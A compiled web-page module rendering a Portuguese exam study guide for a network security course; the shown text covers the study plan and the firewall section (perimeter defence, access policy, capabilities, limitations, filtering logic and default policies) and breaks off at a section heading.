import{u as s,D as a}from"./app-BkvX7tmV.js";import{g as o,n as e,l as t,G as n}from"./vue-vendor-CiCZ1pRF.js";const r={class:"prose m-auto"},p={__name:"2611-icp473-p3-study-guide.pt",setup:p=>(s({title:"ICP473: guia de estudo da P3",meta:[{property:"og:title",content:"ICP473: guia de estudo da P3"},{name:"twitter:title",content:"ICP473: guia de estudo da P3"}]}),(s,p)=>(n(),o("div",r,[e(a,{cloudStorage:!0,penEmoji:"🖉",strokeColor:"#1d4ed8"}),e(a,{cloudStorage:!0,penEmoji:"🖉",strokeColor:"#dc2626"}),e(a,{cloudStorage:!0,penEmoji:"🖌️",strokeColor:"rgba(250,204,21,0.4)",strokeWidth:20}),e(a,{cloudStorage:!0,penEmoji:"🖌️",strokeColor:"rgba(236,72,153,0.35)",strokeWidth:20}),p[0]||(p[0]=t('<p><strong>Prova:</strong> data a confirmar. <strong>Matéria:</strong> slides 448 a 619 (Aulas 14 a 16), mais as listas 8 e 9.</p><blockquote><p>O link no topo desta página abre a versão em inglês, que tem um glossário português para inglês.</p></blockquote><blockquote><p><strong>Suposição de escopo.</strong> O slide de apresentação do curso lista só P1 e P2. O aluno informa três provas neste período. A P1 cobriu os slides 1 a 248. Esta página supõe que a P2 cobre os slides 249 a 447 (modos de operação, hash, assimétrica, IPsec, TLS) e que a P3 cobre os slides 448 a 619: Aula 14 firewalls, Aula 15 IDS/IPS, Aula 16 vulnerabilidades de software, com as listas 8 e 9. O deck tem 619 páginas, então 619 é o último slide. Cada aula é uma Parte, assim uma mudança de limite só move uma Parte.</p></blockquote><hr><p><div class="table-of-contents"><div class="table-of-contents-anchor"><div class="i-ri-menu-2-fill"></div></div><ul><li><a href="#_0-plano-de-estudo">0. Plano de estudo </a><ul><li><a href="#metodo">Método </a></li><li><a href="#horario">Horário </a></li></ul></li><li><a href="#_1-mapa-da-materia">1. Mapa da matéria </a></li><li><a href="#parte-1-firewalls-aula-14">PARTE 1: Firewalls (Aula 14) </a><ul><li><a href="#_1-1-por-que-firewalls-existem">1.1 Por que firewalls existem </a></li><li><a href="#_1-2-defesa-de-perimetro-e-objetivos-de-projeto">1.2 Defesa de perímetro e objetivos de projeto </a></li><li><a href="#_1-3-a-politica-de-acesso">1.3 A política de acesso </a></li><li><a href="#_1-4-capacidades-e-limitacoes">1.4 Capacidades e limitações </a></li><li><a href="#_1-5-logica-de-filtragem-e-politicas-padrao">1.5 Lógica de filtragem e políticas padrão </a></li><li><a href="#_1-6-tipo-1-firewall-de-filtragem-de-pacotes">1.6 Tipo 1: firewall de filtragem de pacotes </a></li><li><a href="#_1-7-tipo-2-firewall-de-inspecao-com-estado">1.7 Tipo 2: firewall de inspeção com estado </a></li><li><a href="#_1-8-tipo-3-proxy-de-aplicacao-application-level-gateway">1.8 Tipo 3: proxy de aplicação (application-level gateway) </a></li><li><a href="#_1-9-tipo-4-proxy-de-circuito-circuit-level-gateway-e-socks">1.9 Tipo 4: proxy de circuito (circuit-level gateway) e SOCKS </a></li><li><a href="#_1-10-os-quatro-tipos-comparados">1.10 Os quatro tipos comparados </a></li><li><a href="#_1-11-base-do-firewall-host-bastiao-e-outras-plataformas">1.11 Base do firewall: host bastião e outras plataformas </a></li><li><a href="#_1-12-localizacoes-dmz-vpn-e-firewalls-distribuidos">1.12 Localizações: DMZ, VPN e firewalls distribuídos </a></li></ul></li><li><a href="#parte-2-deteccao-e-prevencao-de-intrusao-aula-15">PARTE 2: Detecção e prevenção de intrusão (Aula 15) </a><ul><li><a href="#_2-1-intrusos">2.1 Intrusos </a></li><li><a href="#_2-2-papel-e-limites-de-ids-e-ips">2.2 Papel e limites de IDS e IPS </a></li><li><a href="#_2-3-a-metodologia-de-ataque">2.3 A metodologia de ataque </a></li><li><a href="#_2-4-definicoes-e-componentes-de-um-ids">2.4 Definições e componentes de um IDS </a></li><li><a href="#_2-5-motivacoes-a-suposicao-fundamental-e-o-compromisso">2.5 Motivações, a suposição fundamental e o compromisso </a></li><li><a href="#_2-6-requisitos-de-um-ids">2.6 Requisitos de um IDS </a></li><li><a href="#_2-7-abordagens-de-analise-anomalia-e-assinatura">2.7 Abordagens de análise: anomalia e assinatura </a></li><li><a href="#_2-8-ids-baseado-em-host-hids">2.8 IDS baseado em host (HIDS) </a></li><li><a href="#_2-9-ids-baseado-em-rede-nids">2.9 IDS baseado em rede (NIDS) </a></li><li><a href="#_2-10-honeypots">2.10 Honeypots </a></li><li><a href="#_2-11-a-regra-do-snort">2.11 A regra do Snort </a></li></ul></li><li><a href="#parte-3-vulnerabilidades-de-software-aula-16">PARTE 3: Vulnerabilidades de software (Aula 16) </a><ul><li><a href="#_3-1-a-raiz-do-problema">3.1 A raiz do problema </a></li><li><a href="#_3-2-falha-de-software-versus-seguranca-de-software">3.2 Falha de software versus segurança de software </a></li><li><a href="#_3-3-tratamento-da-entrada-e-estouro-de-buffer">3.3 Tratamento da entrada e estouro de buffer </a></li><li><a href="#_3-4-interpretacao-da-entrada">3.4 Interpretação da entrada </a></li><li><a href="#_3-5-algoritmos-memoria-e-concorrencia">3.5 Algoritmos, memória e concorrência </a></li><li><a href="#_3-6-interacao-com-o-sistema-operacional">3.6 Interação com o sistema operacional </a></li><li><a href="#_3-7-saida-do-programa">3.7 Saída do programa </a></li></ul></li><li><a href="#_4-lista-de-exercicios-8-resolvida-firewalls">4. Lista de exercícios 8, resolvida (firewalls) </a><ul><li><a href="#secao-1-conceitos-de-seguranca-e-estrategia-de-defesa">Seção 1: conceitos de segurança e estratégia de defesa </a></li><li><a href="#secao-2-filtros-de-pacotes">Seção 2: filtros de pacotes </a></li><li><a href="#secao-3-firewalls-de-aplicacao-proxies">Seção 3: firewalls de aplicação (proxies) </a></li><li><a href="#secao-4-logica-de-filtragem-e-implementacao-de-politica">Seção 4: lógica de filtragem e implementação de política </a></li><li><a href="#secao-5-drop-versus-reject">Seção 5: DROP versus REJECT </a></li></ul></li><li><a href="#_5-lista-de-exercicios-9-resolvida-ids-ips">5. Lista de exercícios 9, resolvida (IDS/IPS) </a><ul><li><a href="#secao-1-deteccao-e-prevencao-de-intrusao">Seção 1: detecção e prevenção de intrusão </a></li><li><a href="#secao-2-detectar-uma-intrusao">Seção 2: detectar uma intrusão </a></li><li><a href="#secao-3-nids-e-hids">Seção 3: NIDS e HIDS </a></li><li><a href="#secao-4-a-regra-do-snort">Seção 4: a regra do Snort </a></li></ul></li><li><a href="#_6-numeros-e-armadilhas">6. Números e armadilhas </a><ul><li><a href="#numeros-para-memorizar">Números para memorizar </a></li><li><a href="#armadilhas">Armadilhas </a></li></ul></li><li><a href="#_7-baralhos-de-recordacao">7. Baralhos de recordação </a><ul><li><a href="#_7-1-baralho-f-firewalls">7.1 Baralho F: firewalls </a><ul><li><a href="#perguntas">Perguntas </a></li><li><a href="#respostas">Respostas </a></li></ul></li><li><a href="#_7-2-baralho-d-ids-ips-honeypots-e-snort">7.2 Baralho D: IDS/IPS, honeypots e Snort </a><ul><li><a href="#perguntas-1">Perguntas </a></li><li><a href="#respostas-1">Respostas </a></li></ul></li><li><a href="#_7-3-baralho-v-vulnerabilidades-de-software">7.3 Baralho V: vulnerabilidades de software </a><ul><li><a href="#perguntas-2">Perguntas </a></li><li><a href="#respostas-2">Respostas </a></li></ul></li></ul></li><li><a href="#_8-esqueletos-de-dissertativa">8. Esqueletos de dissertativa </a></li><li><a href="#_9-simulado-45-minutos-sem-consulta">9. Simulado (45 minutos, sem consulta) </a></li></ul></div></p><h2 id="_0-plano-de-estudo" tabindex="-1"><span class="cut mono-2 wght-4 slnt-1 step-0">0</span><span class="cut mono-5 wght-3 slnt-5 step-3">.</span> <span class="cut mono-3 wght-3 slnt-0 step-1">P</span><span class="cut mono-0 wght-4 slnt-4 step-2">l</span><span class="cut mono-0 wght-1 slnt-0 step-3">a</span><span class="cut mono-5 wght-2 slnt-5 step-1">n</span><span class="cut mono-0 wght-0 slnt-4 step-3">o</span> <span class="cut mono-3 wght-3 slnt-5 step-0">d</span><span class="cut mono-4 wght-2 slnt-1 step-2">e</span> <span class="cut mono-0 wght-4 slnt-4 step-1">e</span><span class="cut mono-3 wght-5 slnt-4 step-3">s</span><span class="cut mono-1 wght-1 slnt-3 step-0">t</span><span class="cut mono-3 wght-4 slnt-3 step-0">u</span><span class="cut mono-0 wght-0 slnt-2 step-1">d</span><span class="cut mono-0 wght-4 slnt-1 step-1">o</span> <a class="header-anchor" href="#_0-plano-de-estudo" aria-hidden="true">#</a></h2><p>Estude pelos baralhos da seção 7. Abra uma Parte só para conferir um cartão errado.</p><h3 id="metodo" tabindex="-1"><span class="cut mono-2 wght-1 slnt-0 step-0">M</span><span class="cut mono-1 wght-2 slnt-1 step-3">é</span><span class="cut mono-4 wght-1 slnt-3 step-3">t</span><span class="cut mono-2 wght-5 slnt-1 step-0">o</span><span class="cut mono-4 wght-1 slnt-4 step-0">d</span><span class="cut mono-0 wght-3 slnt-5 step-2">o</span> <a class="header-anchor" href="#metodo" aria-hidden="true">#</a></h3><ol><li>Antes de um baralho, escreva o que lembra do tema. 2 minutos.</li><li>Responda cada pergunta em frases completas, com a justificativa e o número, antes de rolar até as respostas.</li><li>Marque cada cartão como acerto ou erro. Anote os códigos dos erros, por exemplo <code>F6 D9 V3</code>.</li><li>Refaça os erros até cada um virar acerto.</li><li>Comece cada sessão seguinte com todos os erros acumulados. Um acerto em uma sessão posterior limpa o erro.</li></ol><h3 id="horario" tabindex="-1"><span class="cut mono-3 wght-2 slnt-2 step-3">H</span><span class="cut mono-3 wght-5 slnt-0 step-0">o</span><span class="cut mono-3 wght-0 slnt-1 step-1">r</span><span class="cut mono-1 wght-1 slnt-4 step-2">á</span><span class="cut mono-4 wght-4 slnt-4 step-0">r</span><span class="cut mono-3 wght-3 slnt-5 step-1">i</span><span class="cut mono-1 wght-1 slnt-0 step-0">o</span> <a class="header-anchor" href="#horario" aria-hidden="true">#</a></h3><p>Sessões de 45 minutos. Um baralho por sessão. Os erros são refeitos na sessão seguinte.</p><div class="table-wrapper"><table><thead><tr><th>Sessão</th><th>Conteúdo</th></tr></thead><tbody><tr><td>1</td><td>Baralho F (firewalls). Tabelas da seção 4 da lista 8 no papel.</td></tr><tr><td>2</td><td>Baralho D (IDS/IPS, honeypots, Snort), depois erros.</td></tr><tr><td>3</td><td>Baralho V (vulnerabilidades de software), depois erros.</td></tr><tr><td>4</td><td>Números da seção 6, esqueletos da seção 8, depois erros.</td></tr><tr><td>5</td><td>Simulado, seção 9. 45 minutos, sem consulta.</td></tr><tr><td>6</td><td>Corrigir o simulado com os baralhos. Refazer erros.</td></tr><tr><td>7</td><td>Dia da prova, 20 minutos: seção 6 e a lista de erros.</td></tr></tbody></table></div><p>Papel é necessário em F9, F10 e D17.</p><p><strong>Regra prática:</strong> as questões do professor sempre dizem <em>justifique</em>. Nomear o mecanismo não vale nada. A nota vem de duas coisas: <strong>qual problema o mecanismo resolve</strong>, e <strong>como ele falha</strong>.</p><hr><h2 id="_1-mapa-da-materia" tabindex="-1"><span class="cut mono-0 wght-5 slnt-3 step-0">1</span><span class="cut mono-1 wght-3 slnt-2 step-1">.</span> <span class="cut mono-4 wght-2 slnt-1 step-0">M</span><span class="cut mono-5 wght-2 slnt-5 step-3">a</span><span class="cut mono-4 wght-3 slnt-3 step-1">p</span><span class="cut mono-0 wght-1 slnt-3 step-3">a</span> <span class="cut mono-1 wght-2 slnt-4 step-1">d</span><span class="cut mono-0 wght-4 slnt-2 step-1">a</span> <span class="cut mono-4 wght-1 slnt-3 step-1">m</span><span class="cut mono-0 wght-2 slnt-3 step-1">a</span><span class="cut mono-2 wght-5 slnt-1 step-0">t</span><span class="cut mono-1 wght-2 slnt-0 step-2">é</span><span class="cut mono-0 wght-5 slnt-0 step-3">r</span><span class="cut mono-0 wght-5 slnt-2 step-0">i</span><span class="cut mono-0 wght-0 slnt-2 step-1">a</span> <a class="header-anchor" href="#_1-mapa-da-materia" aria-hidden="true">#</a></h2><div class="table-wrapper"><table><thead><tr><th>Aula</th><th>Tema</th><th>Slides</th></tr></thead><tbody><tr><td>14</td><td>Firewalls, tipos, host bastião, DMZ, VPN</td><td>448 a 508</td></tr><tr><td>15</td><td>Intrusos, IDS/IPS, HIDS, NIDS, honeypots</td><td>509 a 564</td></tr><tr><td>16</td><td>Vulnerabilidades de software, programação defensiva</td><td>565 a 619</td></tr></tbody></table></div><p>Listas que caem nesse intervalo:</p><ul><li><strong>Lista 8:</strong> firewalls (Aula 14). Resolvida na seção 4.</li><li><strong>Lista 9:</strong> IDS/IPS e a regra do Snort (Aula 15). Resolvida na seção 5.</li><li>A Aula 16 não tem lista de exercícios. O baralho V e o esqueleto de dissertativa E5 cobrem a aula.</li></ul><hr><h2 id="parte-1-firewalls-aula-14" tabindex="-1"><span class="cut mono-1 wght-0 slnt-4 step-1">P</span><span class="cut mono-0 wght-0 slnt-5 step-3">A</span><span class="cut mono-2 wght-3 slnt-1 step-0">R</span><span class="cut mono-5 wght-2 slnt-4 step-0">T</span><span class="cut mono-0 wght-0 slnt-5 step-3">E</span> <span class="cut mono-2 wght-4 slnt-2 step-2">1</span><span class="cut mono-4 wght-3 slnt-4 step-3">:</span> <span class="cut mono-5 wght-4 slnt-2 step-3">F</span><span class="cut mono-0 wght-5 slnt-1 step-0">i</span><span class="cut mono-2 wght-4 slnt-3 step-2">r</span><span class="cut mono-0 wght-4 slnt-2 step-1">e</span><span class="cut mono-1 wght-1 slnt-2 step-2">w</span><span class="cut mono-2 wght-5 slnt-2 step-3">a</span><span class="cut mono-0 wght-3 slnt-2 step-1">l</span><span class="cut mono-2 wght-2 slnt-5 step-2">l</span><span class="cut mono-2 wght-0 slnt-1 step-3">s</span> <span class="cut mono-1 wght-1 slnt-5 step-0">(</span><span class="cut mono-5 wght-4 slnt-0 step-0">A</span><span class="cut mono-1 wght-5 slnt-5 step-2">u</span><span class="cut mono-0 wght-3 slnt-2 step-0">l</span><span class="cut mono-0 wght-0 slnt-5 step-0">a</span> <span class="cut mono-0 wght-5 slnt-0 step-0">1</span><span class="cut mono-1 wght-5 slnt-3 step-3">4</span><span class="cut mono-2 wght-2 slnt-2 step-3">)</span> <a class="header-anchor" href="#parte-1-firewalls-aula-14" aria-hidden="true">#</a></h2><h3 id="_1-1-por-que-firewalls-existem" tabindex="-1"><span class="cut mono-2 wght-2 slnt-4 step-0">1</span><span class="cut mono-0 wght-0 slnt-4 step-1">.</span><span class="cut mono-5 wght-2 slnt-5 step-0">1</span> <span class="cut mono-1 wght-4 slnt-4 step-0">P</span><span class="cut mono-3 wght-4 slnt-1 step-1">o</span><span class="cut mono-5 wght-0 slnt-1 step-2">r</span> <span class="cut mono-1 wght-0 slnt-4 step-1">q</span><span class="cut mono-3 wght-3 slnt-0 step-1">u</span><span class="cut mono-0 wght-5 slnt-1 step-0">e</span> <span class="cut mono-4 wght-1 slnt-3 step-1">f</span><span class="cut mono-1 wght-1 slnt-5 step-3">i</span><span class="cut mono-2 wght-3 slnt-1 step-3">r</span><span class="cut mono-0 wght-4 slnt-0 step-2">e</span><span class="cut mono-5 wght-3 slnt-2 step-1">w</span><span class="cut mono-1 wght-0 slnt-1 step-1">a</span><span class="cut mono-3 wght-4 slnt-3 step-2">l</span><span class="cut mono-0 wght-2 slnt-3 step-0">l</span><span class="cut mono-5 wght-4 slnt-2 step-0">s</span> <span class="cut mono-3 wght-0 slnt-2 step-1">e</span><span class="cut mono-3 wght-3 slnt-0 step-2">x</span><span class="cut mono-2 wght-2 slnt-5 step-2">i</span><span class="cut mono-3 wght-0 slnt-4 step-1">s</span><span class="cut mono-4 wght-4 slnt-5 step-3">t</span><span class="cut mono-1 wght-0 slnt-0 step-1">e</span><span class="cut mono-1 wght-4 slnt-2 step-0">m</span> <a class="header-anchor" href="#_1-1-por-que-firewalls-existem" aria-hidden="true">#</a></h3><p>Um firewall protege um sistema local ou uma rede contra ameaças vindas da rede. <strong>O dilema (slide 450):</strong> proteger os ativos internos e, ao mesmo tempo, permitir acesso ao mundo externo (WANs e a Internet).</p><p><strong>Os seis estágios da evolução dos sistemas (slides 451 e 452):</strong></p><ol><li>Sistema centralizado (mainframe com terminais conectados diretamente).</li><li>Redes locais (LANs) conectando PCs e terminais entre si e ao mainframe.</li><li>Rede de instalações: várias LANs conectando PCs, servidores e talvez mainframes.</li><li>Rede corporativa: várias redes de instalações, distribuídas geograficamente, conectadas por uma WAN privada.</li><li>Conectividade com a Internet: as redes de instalações conectam-se à Internet, além da WAN privada.</li><li>Nuvem corporativa: servidores virtualizados em data centers, fornecendo serviços internos e externos.</li></ol><p><strong>Por que segurança por máquina não basta (slides 453 e 454):</strong> uma rede com centenas ou milhares de sistemas roda vários sistemas operacionais. Quando uma falha de segurança é encontrada, todo sistema afetado precisa de correção. Isso exige gerência de configuração escalável e aplicação agressiva de correções. É difícil, e em alguns casos não compensa o custo. O firewall é a alternativa amplamente aceita, ou o complemento, à segurança baseada no host.</p><h3 id="_1-2-defesa-de-perimetro-e-objetivos-de-projeto" tabindex="-1"><span class="cut mono-4 wght-5 slnt-2 step-0">1</span><span class="cut mono-0 wght-0 slnt-3 step-3">.</span><span class="cut mono-2 wght-0 slnt-3 step-2">2</span> <span class="cut mono-2 wght-4 slnt-0 step-3">D</span><span class="cut mono-4 wght-5 slnt-4 step-0">e</span><span class="cut mono-0 wght-1 slnt-1 step-1">f</span><span class="cut mono-0 wght-5 slnt-5 step-0">e</span><span class="cut mono-5 wght-0 slnt-3 step-3">s</span><span class="cut mono-2 wght-4 slnt-5 step-1">a</span> <span class="cut mono-1 wght-3 slnt-3 step-0">d</span><span class="cut mono-1 wght-1 slnt-2 step-1">e</span> <span class="cut mono-5 wght-3 slnt-3 step-0">p</span><span class="cut mono-5 wght-2 slnt-1 step-0">e</span><span class="cut mono-4 wght-1 slnt-2 step-1">r</span><span class="cut mono-2 wght-2 slnt-2 step-2">í</span><span class="cut mono-1 wght-2 slnt-2 step-2">m</span><span class="cut mono-3 wght-2 slnt-3 step-0">e</span><span class="cut mono-4 wght-2 slnt-4 step-0">t</span><span class="cut mono-4 wght-0 slnt-4 step-1">r</span><span class="cut mono-1 wght-4 slnt-0 step-2">o</span> <span class="cut mono-4 wght-2 slnt-1 step-1">e</span> <span class="cut mono-2 wght-0 slnt-4 step-0">o</span><span class="cut mono-5 wght-2 slnt-3 step-1">b</span><span class="cut mono-0 wght-4 slnt-3 step-3">j</span><span class="cut mono-0 wght-1 slnt-3 step-1">e</span><span class="cut mono-0 wght-0 slnt-4 step-3">t</span><span class="cut mono-5 wght-4 slnt-5 step-3">i</span><span class="cut mono-2 wght-3 slnt-1 step-0">v</span><span class="cut mono-5 wght-2 slnt-0 step-3">o</span><span class="cut mono-4 wght-4 slnt-5 step-2">s</span> <span class="cut mono-3 wght-0 slnt-1 step-2">d</span><span class="cut mono-5 wght-2 slnt-3 step-2">e</span> <span class="cut mono-0 wght-0 slnt-1 step-0">p</span><span class="cut mono-4 wght-3 slnt-3 step-3">r</span><span class="cut mono-1 wght-5 slnt-2 step-0">o</span><span class="cut mono-5 wght-5 slnt-4 step-3">j</span><span class="cut mono-2 wght-4 slnt-4 step-3">e</span><span class="cut mono-0 wght-3 slnt-2 step-1">t</span><span class="cut mono-5 wght-3 slnt-4 step-0">o</span> <a class="header-anchor" href="#_1-2-defesa-de-perimetro-e-objetivos-de-projeto" aria-hidden="true">#</a></h3><p><strong>Posição (slide 455):</strong> entre a rede das instalações e a Internet. <strong>Objetivo:</strong> um enlace controlado, uma muralha de segurança externa (o <strong>perímetro</strong>), proteção contra ataques vindos da Internet.</p><p><strong>Ponto de gargalo:</strong> um ponto único onde segurança e auditoria podem ser impostas. O firewall pode ser um computador, ou dois ou mais sistemas que cooperam. <strong>Resultado:</strong> defesa em profundidade, a doutrina militar clássica. O firewall acrescenta uma camada que isola os sistemas internos.</p><p><strong>Os três objetivos de projeto, de [BELL94] (slide 456):</strong></p><ol><li><strong>Centralização do tráfego:</strong> todo o tráfego, nos dois sentidos, passa pelo firewall. Como: bloquear fisicamente todo outro caminho para a rede local.</li><li><strong>Controle de autorização:</strong> só passa o tráfego autorizado pela política de segurança local. Como: a política de acesso.</li><li><strong>Imunidade do firewall:</strong> o próprio firewall é imune a penetração. Como: um sistema reforçado com um sistema operacional seguro.</li></ol><h3 id="_1-3-a-politica-de-acesso" tabindex="-1"><span class="cut mono-3 wght-4 slnt-1 step-0">1</span><span class="cut mono-3 wght-2 slnt-4 step-3">.</span><span class="cut mono-0 wght-5 slnt-3 step-1">3</span> <span class="cut mono-0 wght-0 slnt-5 step-2">A</span> <span class="cut mono-0 wght-0 slnt-4 step-0">p</span><span class="cut mono-4 wght-2 slnt-5 step-3">o</span><span class="cut mono-1 wght-2 slnt-0 step-3">l</span><span class="cut mono-4 wght-2 slnt-3 step-0">í</span><span class="cut mono-5 wght-2 slnt-3 step-2">t</span><span class="cut mono-4 wght-1 slnt-3 step-3">i</span><span class="cut mono-4 wght-3 slnt-4 step-0">c</span><span class="cut mono-2 wght-1 slnt-3 step-1">a</span> <span class="cut mono-0 wght-1 slnt-2 step-0">d</span><span class="cut mono-3 wght-1 slnt-5 step-3">e</span> <span class="cut mono-5 wght-0 slnt-0 step-3">a</span><span class="cut mono-3 wght-1 slnt-5 step-0">c</span><span class="cut mono-4 wght-1 slnt-5 step-2">e</span><span class="cut mono-4 wght-4 slnt-0 step-3">s</span><span class="cut mono-2 wght-5 slnt-1 step-2">s</span><span class="cut mono-2 wght-2 slnt-2 step-1">o</span> <a class="header-anchor" href="#_1-3-a-politica-de-acesso" aria-hidden="true">#</a></h3><p><strong>Política de acesso (slide 457):</strong> a lista dos tipos de tráfego autorizados a passar pelo firewall. Critérios: faixas de endereços, protocolos, aplicações, tipos de conteúdo.</p><p><strong>Desenvolvimento da política:</strong> ela vem da <strong>avaliação de risco</strong> e da política de segurança da informação da organização. Começa ampla (quais tipos de tráfego a organização precisa suportar), é refinada em <strong>elementos de filtro</strong> específicos, e é implementada na topologia do firewall. A política dita as regras, não o contrário.</p><p><strong>Quatro características pelas quais a política pode filtrar (NIST SP 800-41, slides 458 e 459):</strong></p><div class="table-wrapper"><table><thead><tr><th>Característica</th><th>Controla o acesso por</th><th>Usada por</th></tr></thead><tbody><tr><td>Endereço IP e protocolo</td><td>Endereços de origem e destino, portas, sentido</td><td>Filtros de pacotes, com estado</td></tr><tr><td>Protocolo de aplicação</td><td>Os dados autorizados do protocolo de aplicação</td><td>Proxy de aplicação</td></tr><tr><td>Identidade do usuário</td><td>Quem é o usuário, tipicamente usuários internos</td><td>Exige autenticação IPsec</td></tr><tr><td>Atividade de rede</td><td>Hora, taxa de requisições (varredura), padrões</td><td>Qualquer</td></tr></tbody></table></div><p>Exemplos para o protocolo de aplicação: verificar e-mail (SMTP) contra spam, ou requisições HTTP contra sites autorizados.</p><h3 id="_1-4-capacidades-e-limitacoes" tabindex="-1"><span class="cut mono-2 wght-0 slnt-0 step-0">1</span><span class="cut mono-2 wght-0 slnt-4 step-1">.</span><span class="cut mono-1 wght-0 slnt-2 step-3">4</span> <span class="cut mono-2 wght-1 slnt-5 step-2">C</span><span class="cut mono-0 wght-2 slnt-5 step-0">a</span><span class="cut mono-0 wght-0 slnt-0 step-2">p</span><span class="cut mono-1 wght-3 slnt-2 step-3">a</span><span class="cut mono-3 wght-4 slnt-5 step-1">c</span><span class="cut mono-5 wght-3 slnt-1 step-3">i</span><span class="cut mono-2 wght-0 slnt-5 step-0">d</span><span class="cut mono-3 wght-3 slnt-4 step-3">a</span><span class="cut mono-2 wght-0 slnt-1 step-1">d</span><span class="cut mono-0 wght-3 slnt-1 step-3">e</span><span class="cut mono-4 wght-1 slnt-0 step-1">s</span> <span class="cut mono-0 wght-3 slnt-0 step-3">e</span> <span class="cut mono-0 wght-0 slnt-2 step-0">l</span><span class="cut mono-4 wght-0 slnt-4 step-3">i</span><span class="cut mono-5 wght-2 slnt-0 step-3">m</span><span class="cut mono-2 wght-3 slnt-4 step-0">i</span><span class="cut mono-3 wght-5 slnt-0 step-1">t</span><span class="cut mono-2 wght-5 slnt-1 step-1">a</span><span class="cut mono-2 wght-5 slnt-5 step-2">ç</span><span class="cut mono-5 wght-1 slnt-3 step-2">õ</span><span class="cut mono-4 wght-4 slnt-1 step-2">e</span><span class="cut mono-5 wght-2 slnt-1 step-1">s</span> <a class="header-anchor" href="#_1-4-capacidades-e-limitacoes" aria-hidden="true">#</a></h3><p><strong>Quatro capacidades (slide 460):</strong></p><ol><li><strong>Ponto de gargalo único.</strong> Mantém usuários não autorizados fora, proíbe serviços vulneráveis de entrar ou sair, protege contra falsificação de IP e ataques de roteamento. Simplifica a gerência de segurança.</li><li><strong>Um local para monitoramento:</strong> auditorias e alarmes.</li><li><strong>Uma plataforma para funções de Internet sem relação com segurança:</strong> NAT (mapeia endereços locais em endereços de Internet) e gerência de rede (registra o uso da Internet).</li><li><strong>Uma plataforma para IPsec:</strong> VPNs pelo modo túnel do IPsec.</li></ol><p><strong>Quatro limitações (slide 461):</strong></p><ol><li>Não protege contra ataques que o <strong>contornam</strong>: sistemas internos com enlace próprio a um provedor (banda larga móvel ou cabeada), LANs com enlaces diretos a organizações parceiras.</li><li>Não protege totalmente contra <strong>ameaças internas</strong>: um funcionário descontente, ou um funcionário que coopera sem saber com um atacante (phishing).</li><li><strong>LANs sem fio inseguras</strong> podem ser alcançadas de fora. Firewalls internos não impedem comunicação sem fio direta entre sistemas em lados opostos do firewall.</li><li><strong>Dispositivos portáteis infectados (BYOD):</strong> um laptop, PDA ou pen drive infectado fora e depois conectado dentro, carregando a ameaça.</li></ol><h3 id="_1-5-logica-de-filtragem-e-politicas-padrao" tabindex="-1"><span class="cut mono-3 wght-0 slnt-1 step-2">1</span><span class="cut mono-2 wght-4 slnt-4 step-1">.</span><span class="cut mono-5 wght-4 slnt-1 step-1">5</span> <span class="cut mono-0 wght-5 slnt-4 step-0">L</span><span class="cut mono-3 wght-3 slnt-2 step-2">ó</span><span class="cut mono-3 wght-3 slnt-2 step-2">g</span><span class="cut mono-3 wght-0 slnt-3 step-0">i</span><span class="cut mono-0 wght-5 slnt-4 step-2">c</span><span class="cut mono-0 wght-5 slnt-4 step-2">a</span> <span class="cut mono-2 wght-0 slnt-0 step-0">d</span><span class="cut mono-5 wght-0 slnt-1 step-2">e</span> <span class="cut mono-2 wght-5 slnt-0 step-3">f</span><span class="cut mono-5 wght-0 slnt-2 step-0">i</span><span class="cut mono-3 wght-1 slnt-1 step-2">l</span><span class="cut mono-5 wght-5 slnt-3 step-0">t</span><span class="cut mono-0 wght-3 slnt-5 step-1">r</span><span class="cut mono-3 wght-0 slnt-2 step-2">a</span><span class="cut mono-1 wght-1 slnt-5 step-2">g</span><span class="cut mono-4 wght-5 slnt-5 step-1">e</span><span class="cut mono-3 wght-1 slnt-1 step-2">m</span> <span class="cut mono-1 wght-0 slnt-1 step-2">e</span> <span class="cut mono-4 wght-5 slnt-2 step-1">p</span><span class="cut mono-3 wght-5 slnt-2 step-2">o</span><span class="cut mono-3 wght-4 slnt-3 step-3">l</span><span class="cut mono-4 wght-1 slnt-4 step-2">í</span><span class="cut mono-4 wght-2 slnt-1 step-0">t</span><span class="cut mono-4 wght-5 slnt-4 step-1">i</span><span class="cut mono-0 wght-3 slnt-4 step-2">c</span><span class="cut mono-1 wght-1 slnt-1 step-1">a</span><span class="cut mono-3 wght-1 slnt-5 step-0">s</span> <span class="cut mono-4 wght-2 slnt-0 step-1">p</span><span class="cut mono-2 wght-5 slnt-0 step-0">a</span><span class="cut mono-5 wght-4 slnt-3 step-1">d</span><span class="cut mono-3 wght-0 slnt-1 step-1">r</span><span class="cut mono-2 wght-4 slnt-4 step-3">ã</span><span class="cut mono-3 wght-5 slnt-5 step-3">o</span> <a class="header-anchor" href="#_1-5-logica-de-filtragem-e-politicas-padrao" aria-hidden="true">#</a></h3><p>Um firewall pode monitorar o tráfego em vários níveis (slide 464): pacotes de baixo nível, isolados ou como um fluxo; todo o tráfego dentro de uma conexão de transporte; detalhes de protocolos de aplicação. A política de acesso decide o nível.</p><div class="table-wrapper"><table><thead><tr><th>Lógica de filtragem</th><th>Regra</th><th>Última regra</th></tr></thead><tbody><tr><td><strong>Filtro positivo</strong></td><td>Passa só os pacotes que atendem a critérios específicos</td><td>Um <strong>deny</strong> no final</td></tr><tr><td><strong>Filtro negativo</strong></td><td>Rejeita qualquer pacote que atende a certos critérios</td><td>Um <strong>allow</strong> no final</td></tr></tbody></table></div><p>O que o firewall examina depende do tipo: um ou mais cabeçalhos de protocolo de cada pacote, a carga útil de cada pacote, ou o padrão de uma sequência de pacotes.</p><p><strong>As duas políticas padrão (slide 466):</strong></p><div class="table-wrapper"><table><thead><tr><th>Política</th><th>Descarte padrão</th><th>Encaminhamento padrão</th></tr></thead><tbody><tr><td>Lema</td><td>&quot;O que não é expressamente permitido é proibido&quot;</td><td>&quot;O que não é expressamente proibido é permitido&quot;</td></tr><tr><td>Segurança</td><td>Mais conservadora, mais segura</td><td>Reduzida</td></tr><tr><td>Início</td><td>Tudo bloqueado, serviços adicionados caso a caso</td><td>Tudo aberto</td></tr><tr><td>Usuários</td><td>Mais visível, vista como obstáculo no início</td><td>Mais fácil para os usuários finais</td></tr><tr><td>Administrador</td><td>Adiciona serviços sob demanda</td><td>Reage a cada nova ameaça conforme surge</td></tr><tr><td>Quem usa</td><td>Empresas e governo</td><td>Organizações mais abertas, como universidades</td></tr></tbody></table></div><p>Um filtro de pacotes é uma lista de regras. O firewall compara os cabeçalhos IP e TCP de cada pacote com a lista, de cima para baixo. Em caso de correspondência, a ação da regra executa (encaminhar ou descartar). Sem correspondência, a ação padrão executa.</p><h3 